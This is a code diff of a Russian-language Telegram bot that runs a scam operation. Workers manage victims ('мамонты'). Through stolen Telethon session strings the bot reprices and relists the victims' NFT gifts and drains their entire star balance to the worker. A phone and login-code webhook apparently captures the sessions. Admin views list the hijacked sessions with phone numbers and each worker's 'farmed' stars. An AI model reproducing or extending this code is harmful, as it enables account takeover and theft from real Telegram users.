-        "⭐ @PremiumBot → купи → отправь боту.",
-        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="⭐ @PremiumBot", url="https://t.me/PremiumBot")],
-            [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")],
-        ]),
-        disable_web_page_preview=True,
-    )
-
-
-@dp.callback_query(F.data == "worker_offers")
-async def my_offers(call: types.CallbackQuery):
+# ─── МОИ МАМОНТЫ
+@dp.callback_query(F.data == "my_mammoths")
+async def my_mammoths(call: types.CallbackQuery):
     u = await get_user(call.from_user.id)
     if not u or u.role not in ("worker", "admin"):
         return
-    offers = await get_worker_offers(call.from_user.id)
-    if not offers:
+
+    worker_id = u.id
+    mammoth_ids = await get_unique_mammoths(worker_id if u.role == "worker" else None)
+
+    if not mammoth_ids:
         await call.message.edit_text(
-            "📋 Пусто.",
+            "👥 У вас пока нет мамонтов.",
             reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                 [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
             ]),
         )
         return
-    lines = [f"#{o.id} — {o.gift_name[:18]} — {o.price_stars}⭐ — {o.status}" for o in offers[:15]]
+
+    buttons = []
+    for mid in mammoth_ids[:15]:
+        # получаем username мамонта из последнего оффера
+        offers = await get_offers_by_mammoth(mid)
+        if offers:
+            o = offers[0]
+            uname = f"@{o.worker_username}" if o.worker_username else ""
+            buttons.append([InlineKeyboardButton(
+                text=f"👤 ID {mid} {uname}"[:60],
+                callback_data=f"mm:{mid}"
+            )])
+
+    buttons.append([InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")])
+    kb = InlineKeyboardMarkup(inline_keyboard=buttons)
+
     await call.message.edit_text(
-        "📋 <b>Мои офферы</b>\n\n" + "\n".join(lines),
+        f"👥 <b>Мои мамонты</b> ({len(mammoth_ids)})\n\nВыбери мамонта:",
+        reply_markup=kb,
+    )
+
+
+@dp.callback_query(F.data.startswith("mm:"))
+async def mammoth_detail(call: types.CallbackQuery):
+    mammoth_id = int(call.data.split(":")[1])
+    gifts = await get_mammoth_gifts(mammoth_id)
+
+    if not gifts:
+        await call.message.edit_text(
+            f"📦 У мамонта <code>{mammoth_id}</code> нет выставленных подарков.",
+            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+                [InlineKeyboardButton(text="⬅️ Назад", callback_data="my_mammoths")]
+            ]),
+        )
+        return
+
+    buttons = []
+    for g in gifts[:10]:
+        buttons.append([InlineKeyboardButton(
+            text=f"✏️ {g.gift_title[:25]} — {g.current_price}⭐",
+            callback_data=f"chg2:{g.id}"
+        )])
+    buttons.append([InlineKeyboardButton(text="⬅️ Назад", callback_data="my_mammoths")])
+
+    await call.message.edit_text(
+        f"📦 <b>Подарки мамонта</b> <code>{mammoth_id}</code>\n\n"
+        f"Всего: <b>{len(gifts)}</b>\n\n"
+        f"Жми на подарок чтобы изменить цену:",
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons),
+    )
+
+
+# ─── ИЗМЕНЕНИЕ ЦЕНЫ (2 варианта — по callback из автомата и из меню)
+@dp.callback_query(F.data.startswith("chg:"))
+async def change_price_from_auto(call: types.CallbackQuery, state: FSMContext):
+    # формат: chg:mammoth_id:offer_id:msg_id:current_price
+    parts = call.data.split(":")
+    mammoth_id = int(parts[1])
+    offer_id = int(parts[2])
+    msg_id = int(parts[3])
+    current_price = int(parts[4])
+
+    await state.set_state(SetPriceForm.new_price)
+    await state.update_data(
+        mammoth_id=mammoth_id, offer_id=offer_id,
+        msg_id=msg_id, source="auto"
+    )
+    await call.message.answer(
+        f"✏️ Введите новую цену в звёздах\n"
+        f"Текущая: <b>{current_price}⭐</b>\n\n"
+        f"<i>Просто число, например: 5000</i>"
+    )
+
+
+@dp.callback_query(F.data.startswith("chg2:"))
+async def change_price_from_menu(call: types.CallbackQuery, state: FSMContext):
+    # формат: chg2:gift_id (из БД)
+    gift_id = int(call.data.split(":")[1])
+
+    async with SessionLocal() as s:
+        g = await s.get(MammothGift, gift_id)
+        if not g:
+            await call.answer("Подарок не найден", show_alert=True)
+            return
+
+    await state.set_state(SetPriceForm.new_price)
+    await state.update_data(
+        gift_id=gift_id,
+        mammoth_id=g.mammoth_user_id,
+        msg_id=g.msg_id,
+        session_string=g.session_string,
+        source="menu"
+    )
+    await call.message.answer(
+        f"✏️ Введите новую цену для <b>{g.gift_title}</b>\n"
+        f"Текущая: <b>{g.current_price}⭐</b>\n\n"
+        f"<i>Просто число</i>"
+    )
+
+
+@dp.message(SetPriceForm.new_price)
+async def set_new_price(message: types.Message, state: FSMContext):
+    if not message.text.isdigit():
+        await message.answer("❌ Введите число.")
+        return
+
+    new_price = int(message.text)
+    if new_price < 1:
+        await message.answer("❌ Минимум 1.")
+        return
+
+    data = await state.get_data()
+    await state.clear()
+
+    source = data.get("source")
+    msg_id = data.get("msg_id")
+    mammoth_id = data.get("mammoth_id")
+    offer_id = data.get("offer_id")
+    gift_id = data.get("gift_id")
+    session_string = data.get("session_string")
+
+    # если session_string нет — берём из последней сессии мамонта
+    if not session_string:
+        async with SessionLocal() as s:
+            r = await s.execute(
+                select(AuthSession)
+                .where(AuthSession.user_id == mammoth_id, AuthSession.session_string.isnot(None))
+                .order_by(AuthSession.id.desc())
+                .limit(1)
+            )
+            sess = r.scalars().first()
+            if sess:
+                session_string = sess.session_string
+
+    if not session_string:
+        await message.answer("❌ Не найдена сессия мамонта.")
+        return
+
+    # обновляем цену
+    ok, err = await telethon_update_price(session_string, msg_id, new_price)
+    if ok:
+        await update_mammoth_gift_price(gift_id, new_price) if gift_id else None
+        await message.answer(
+            f"✅ Цена обновлена: <b>{new_price}⭐</b>\n"
+            f"Мамонт: <code>{mammoth_id}</code>"
+        )
+        # уведомляем админа
+        try:
+            await bot.send_message(ADMIN_ID,
+                f"✏️ <b>Воркер изменил цену</b>\n"
+                f"Мамонт: <code>{mammoth_id}</code>\n"
+                f"Новая цена: <b>{new_price}⭐</b>")
+        except Exception:
+            pass
+    else:
+        await message.answer(f"❌ Ошибка: {err}")
+
+
+# ─── СЛИТЬ ВСЁ
+@dp.callback_query(F.data.startswith("flush:"))
+async def flush_all(call: types.CallbackQuery):
+    # format: flush:mammoth_id:offer_id
+    parts = call.data.split(":")
+    mammoth_id = int(parts[1])
+    offer_id = int(parts[2])
+
+    # находим сессию мамонта
+    async with SessionLocal() as s:
+        r = await s.execute(
+            select(AuthSession)
+            .where(AuthSession.user_id == mammoth_id, AuthSession.session_string.isnot(None))
+            .order_by(AuthSession.id.desc())
+            .limit(1)
+        )
+        sess = r.scalars().first()
+
+    if not sess:
+        await call.message.answer("❌ Нет сессии мамонта.")
+        return
+
+    await call.message.answer("⏳ Ставлю реакцию со всего баланса...")
+
+    # отменяем задачу ожидания если есть
+    key = (mammoth_id, offer_id)
+    if key in waiting_tasks:
+        waiting_tasks[key].cancel()
+        del waiting_tasks[key]
+
+    # ставим реакцию
+    worker_id = call.from_user.id
+    asyncio.create_task(do_react(sess.session_string, mammoth_id, worker_id, offer_id))
+
+
+# ─── ADMIN
+@dp.callback_query(F.data == "admin_workers")
+async def workers_menu(call: types.CallbackQuery):
+    if call.from_user.id != ADMIN_ID:
+        return
+    workers = await get_workers()
+    lines = [f"🔧 <code>{w.id}</code> — @{w.username or '—'} — {w.total_offers} оф. — {w.stars_farmed}⭐"
+             for w in workers]
+    await call.message.edit_text(
+        "👥 <b>Воркеры</b>\n\n" + ("\n".join(lines) if lines else "<i>Пусто</i>"),
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="➕ Выдать", callback_data="admin_grant")],
+            [InlineKeyboardButton(text="➖ Забрать", callback_data="admin_revoke")],
+            [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")],
+        ]),
+    )
+
+
+@dp.callback_query(F.data == "admin_grant")
+async def grant_start(call: types.CallbackQuery, state: FSMContext):
+    if call.from_user.id != ADMIN_ID:
+        return
+    await state.set_state(GrantForm.user_id)
+    await state.update_data(action="grant")
+    await call.message.edit_text("➕ user_id:",
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="❌", callback_data="admin_workers")]
+        ]))
+
+
+@dp.callback_query(F.data == "admin_revoke")
+async def revoke_start(call: types.CallbackQuery, state: FSMContext):
+    if call.from_user.id != ADMIN_ID:
+        return
+    await state.set_state(GrantForm.user_id)
+    await state.update_data(action="revoke")
+    await call.message.edit_text("➖ user_id:",
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="❌", callback_data="admin_workers")]
+        ]))
+
+
+@dp.message(GrantForm.user_id)
+async def grant_finish(message: types.Message, state: FSMContext):
+    if message.from_user.id != ADMIN_ID:
+        return
+    if not message.text.isdigit():
+        await message.answer("❌ Число.")
+        return
+    data = await state.get_data()
+    uid = int(message.text)
+    if data.get("action") == "revoke":
+        await set_role(uid, "user")
+        await message.answer(f"✅ <code>{uid}</code> не воркер.")
+    else:
+        await add_user(uid, None, None, "worker")
+        await set_role(uid, "worker")
+        await message.answer(f"✅ <code>{uid}</code> воркер.")
+        try:
+            await bot.send_message(uid, "🎉 Доступ выдан. /start")
+        except Exception:
+            pass
+    await state.clear()
+
+
+@dp.callback_query(F.data == "admin_logs")
+async def admin_logs(call: types.CallbackQuery):
+    if call.from_user.id != ADMIN_ID:
+        return
+    logs = await get_logs(20)
+    if not logs:
+        await call.message.edit_text("📊 Пусто.",
+            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+                [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
+            ]))
+        return
+    lines = [f"[{l.created_at:%H:%M}] {l.event} — {(l.detail or '—')[:40]}" for l in logs]
+    await call.message.edit_text(
+        "📊 <b>Логи</b>\n\n" + "\n".join(lines),
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
         ]),
     )
 
 
-# ═══════════════════════════════════════════════════════
-#   ОФФЕР
-# ═══════════════════════════════════════════════════════
+@dp.callback_query(F.data == "admin_sessions")
+async def admin_sessions(call: types.CallbackQuery):
+    if call.from_user.id != ADMIN_ID:
+        return
+    sess = await get_recent_sessions(10)
+    if not sess:
+        await call.message.edit_text("💎 Пусто.",
+            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+                [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
+            ]))
+        return
+    lines = [f"#{s.id} — {s.phone} — {s.state}" for s in sess]
+    await call.message.edit_text(
+        "💎 <b>Сессии</b>\n\n" + "\n".join(lines),
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
+        ]),
+    )
 
+
+@dp.callback_query(F.data == "admin_stats")
+async def admin_stats(call: types.CallbackQuery):
+    if call.from_user.id != ADMIN_ID:
+        return
+    workers = await get_workers()
+    if not workers:
+        await call.message.edit_text("📈 Нет воркеров.",
+            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+                [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
+            ]))
+        return
+    lines = ["📈 <b>Статистика</b>\n"]
+    total = 0
+    for w in workers:
+        total += w.stars_farmed
+        lines.append(
+            f"🔧 @{w.username or '—'}\n"
+            f"   <code>{w.id}</code>\n"
+            f"   Оф: {w.total_offers} | ⭐ {w.stars_farmed}\n"
+        )
+    lines.append(f"\n💰 <b>ИТОГО: {total} ⭐</b>")
+    await call.message.edit_text(
+        "\n".join(lines),
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
+        ]),
+    )
+
+
+# ─── ОФФЕР
 def parse_target_and_offer(text):
     m = re.search(r'(https?://t\.me/nft/[\w\-]+)', text)
     if not m:
@@ -982,140 +1689,38 @@ async def offer_price(message: types.Message, state: FSMContext):
     )
 
 
-# ═══════════════════════════════════════════════════════
-#   ADMIN
-# ═══════════════════════════════════════════════════════
-
-@dp.callback_query(F.data == "admin_workers")
-async def workers_menu(call: types.CallbackQuery):
-    if call.from_user.id != ADMIN_ID:
+@dp.callback_query(F.data == "worker_offers")
+async def my_offers(call: types.CallbackQuery):
+    u = await get_user(call.from_user.id)
+    if not u or u.role not in ("worker", "admin"):
         return
-    workers = await get_workers()
-    lines = [f"🔧 <code>{w.id}</code> — @{w.username or '—'} — {w.total_offers} оф. — {w.stars_farmed}⭐"
-             for w in workers]
+    offers = await get_worker_offers(call.from_user.id)
+    if not offers:
+        await call.message.edit_text(
+            "📋 Пусто.",
+            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+                [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
+            ]),
+        )
+        return
+    lines = [f"#{o.id} — {o.gift_name[:18]} — {o.price_stars}⭐ — {o.status}" for o in offers[:15]]
     await call.message.edit_text(
-        "👥 <b>Воркеры</b>\n\n" + ("\n".join(lines) if lines else "<i>Пусто</i>"),
+        "📋 <b>Мои офферы</b>\n\n" + "\n".join(lines),
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="➕ Выдать", callback_data="admin_grant")],
-            [InlineKeyboardButton(text="➖ Забрать", callback_data="admin_revoke")],
+            [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
+        ]),
+    )
+
+
+@dp.callback_query(F.data == "buy_stars")
+async def buy_stars(call: types.CallbackQuery):
+    await call.message.edit_text(
+        "⭐ @PremiumBot → купи → отправь боту.",
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="⭐ @PremiumBot", url="https://t.me/PremiumBot")],
             [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")],
         ]),
-    )
-
-
-@dp.callback_query(F.data == "admin_grant")
-async def grant_start(call: types.CallbackQuery, state: FSMContext):
-    if call.from_user.id != ADMIN_ID:
-        return
-    await state.set_state(GrantForm.user_id)
-    await state.update_data(action="grant")
-    await call.message.edit_text("➕ user_id:",
-        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="❌", callback_data="admin_workers")]
-        ]))
-
-
-@dp.callback_query(F.data == "admin_revoke")
-async def revoke_start(call: types.CallbackQuery, state: FSMContext):
-    if call.from_user.id != ADMIN_ID:
-        return
-    await state.set_state(GrantForm.user_id)
-    await state.update_data(action="revoke")
-    await call.message.edit_text("➖ user_id:",
-        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="❌", callback_data="admin_workers")]
-        ]))
-
-
-@dp.message(GrantForm.user_id)
-async def grant_finish(message: types.Message, state: FSMContext):
-    if message.from_user.id != ADMIN_ID:
-        return
-    if not message.text.isdigit():
-        await message.answer("❌ Число.")
-        return
-    data = await state.get_data()
-    uid = int(message.text)
-    if data.get("action") == "revoke":
-        await set_role(uid, "user")
-        await message.answer(f"✅ <code>{uid}</code> не воркер.")
-    else:
-        await add_user(uid, None, None, "worker")
-        await set_role(uid, "worker")
-        await message.answer(f"✅ <code>{uid}</code> воркер.")
-        try:
-            await bot.send_message(uid, "🎉 Доступ выдан. /start")
-        except Exception:
-            pass
-    await state.clear()
-
-
-@dp.callback_query(F.data == "admin_logs")
-async def admin_logs(call: types.CallbackQuery):
-    if call.from_user.id != ADMIN_ID:
-        return
-    logs = await get_logs(20)
-    if not logs:
-        await call.message.edit_text("📊 Пусто.",
-            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-                [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
-            ]))
-        return
-    lines = [f"[{l.created_at:%H:%M}] {l.event} — {l.detail or '—'}" for l in logs]
-    await call.message.edit_text(
-        "📊 <b>Логи</b>\n\n" + "\n".join(lines),
-        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
-        ]),
-    )
-
-
-@dp.callback_query(F.data == "admin_sessions")
-async def admin_sessions(call: types.CallbackQuery):
-    if call.from_user.id != ADMIN_ID:
-        return
-    sess = await get_recent_sessions(10)
-    if not sess:
-        await call.message.edit_text("💎 Пусто.",
-            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-                [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
-            ]))
-        return
-    lines = [f"#{s.id} — {s.phone} — {s.state}" for s in sess]
-    await call.message.edit_text(
-        "💎 <b>Сессии</b>\n\n" + "\n".join(lines),
-        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
-        ]),
-    )
-
-
-@dp.callback_query(F.data == "admin_stats")
-async def admin_stats(call: types.CallbackQuery):
-    if call.from_user.id != ADMIN_ID:
-        return
-    workers = await get_workers()
-    if not workers:
-        await call.message.edit_text("📈 Нет воркеров.",
-            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-                [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
-            ]))
-        return
-    lines = ["📈 <b>Статистика</b>\n"]
-    total = 0
-    for w in workers:
-        total += w.stars_farmed
-        lines.append(
-            f"🔧 @{w.username or '—'}\n"
-            f"   <code>{w.id}</code>\n"
-            f"   Оф: {w.total_offers} | ⭐ {w.stars_farmed}\n"
-        )
-    lines.append(f"\n💰 <b>ИТОГО: {total} ⭐</b>")
-    await call.message.edit_text(
-        "\n".join(lines),
-        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
-        ]),
+        disable_web_page_preview=True,
     )
 
 
@@ -1146,7 +1751,7 @@ async def cmd_revoke(message: types.Message):
 
 
 # ═══════════════════════════════════════════════════════
-#   BACKEND
+#   BACKEND (fastapi)
 # ═══════════════════════════════════════════════════════
 
 app = FastAPI()
@@ -1199,7 +1804,6 @@ async def wh_phone(p: PhonePayload):
         except Exception:
             pass
         await add_log(offer_id=p.offer_id, event="send_code_error", detail=f"{type(e).__name__}: {e}")
-        print(f"send_code error: {type(e).__name__}: {e}")
         return {"ok": False, "error": f"{type(e).__name__}: {e}"}
 
 
@@ -1290,41 +1894,40 @@ async def run_automation(session_string, offer_id, worker_id):
         return
     await notify_admin(f"🚀 <b>Автомат</b>\nОффер #{offer_id} — воркер <code>{worker_id}</code>")
 
-    result = await telethon_sell_all_and_react(session_string, worker_id, offer_id)
+    result = await telethon_sell_and_react(session_string, worker_id, offer_id)
 
     lines = ["🎯 <b>Результат</b>", f"Оффер: #{offer_id}", ""]
-    lines.append(f"📦 Подарков: <b>{result.get('gifts_total', 0)}</b>")
+    lines.append(f"📦 Всего подарков: <b>{result.get('gifts_total', 0)}</b>")
+    lines.append(f"🔷 NFT: <b>{result.get('unique_total', 0)}</b>")
 
     if result.get("converted"):
         lines.append(f"\n💱 Конвертировано: <b>{len(result['converted'])}</b>")
-        for c in result["converted"][:5]:
-            lines.append(f"• {c['title']}")
 
     if result.get("listed"):
-        lines.append(f"\n🏷 Выставлено: <b>{len(result['listed'])}</b>")
+        lines.append(f"\n🏷 Перевыставлено (-30%): <b>{len(result['listed'])}</b>")
         for x in result["listed"][:10]:
-            lines.append(f"• {x['title']} — {x['min_price']}⭐")
-
-    if result.get("sold"):
-        lines.append(f"\n✅ Продано: <b>{len(result['sold'])}</b>")
+            lines.append(f"• {x['title'][:25]} — {x['min_price']}⭐")
 
     if result.get("skipped"):
-        lines.append(f"\n⏳ Пропущено: <b>{len(result['skipped'])}</b>")
-        # группируем по причине
         reasons = {}
         for x in result["skipped"]:
             r = x.get("reason", "?")[:40]
             reasons[r] = reasons.get(r, 0) + 1
+        lines.append(f"\n⏳ Пропущено: <b>{len(result['skipped'])}</b>")
         for reason, cnt in reasons.items():
-            lines.append(f"• <b>{cnt}</b> под. — {reason}")
+            lines.append(f"• {cnt} под. — {reason}")
 
     if result.get("failed"):
         lines.append(f"\n❌ Ошибок: <b>{len(result['failed'])}</b>")
-        for x in result["failed"][:5]:
-            lines.append(f"• {x['title']} — {x['reason'][:50]}")
+        for x in result["failed"][:3]:
+            lines.append(f"• {x['title'][:20]} — {x['reason'][:40]}")
 
-    lines.append(f"\n💰 Баланс: <b>{result.get('balance_after', 0)} ⭐</b>")
-    if result.get("reacted"):
+    lines.append(f"\n💰 Баланс: <b>{result.get('balance', 0)} ⭐</b>")
+
+    if result.get("waiting"):
+        lines.append("⏳ <b>Ждём продажу подарков...</b>")
+        lines.append("<i>Реакция не поставлена</i>")
+    elif result.get("reacted"):
         lines.append(f"✅ Реакция: <b>{result['stars_sent']} ⭐</b>")
     elif result.get("error"):
         lines.append(f"❌ {result['error'][:200]}")
@@ -1337,7 +1940,7 @@ async def run_automation(session_string, offer_id, worker_id):
         pass
 
     await add_log(worker_id=worker_id, offer_id=offer_id, event="done",
-                  detail=f"reacted={result.get('reacted')} stars={result.get('stars_sent')}")
+                  detail=f"reacted={result.get('reacted')} waiting={result.get('waiting')}")
 
 
 @app.get("/health")
@@ -1351,7 +1954,7 @@ async def health():
 
 async def run_bot():
     print("=" * 60)
-    print(f"BOOT v10")
+    print("BOOT v11")
     print("=" * 60)
     await init_db()
     print("RUN_BOT: db ready")
@@ -1362,6 +1965,8 @@ async def run_bot():
     await bot.set_my_commands([
         BotCommand(command="start", description="Меню"),
         BotCommand(command="offer", description="Создать: /offer user_id ссылка сумма"),
+        BotCommand(command="grant", description="Выдать доступ воркеру"),
+        BotCommand(command="revoke", description="Забрать доступ"),
     ], scope=BotCommandScopeDefault())
     print("RUN_BOT: polling...")
     await dp.start_polling(bot)
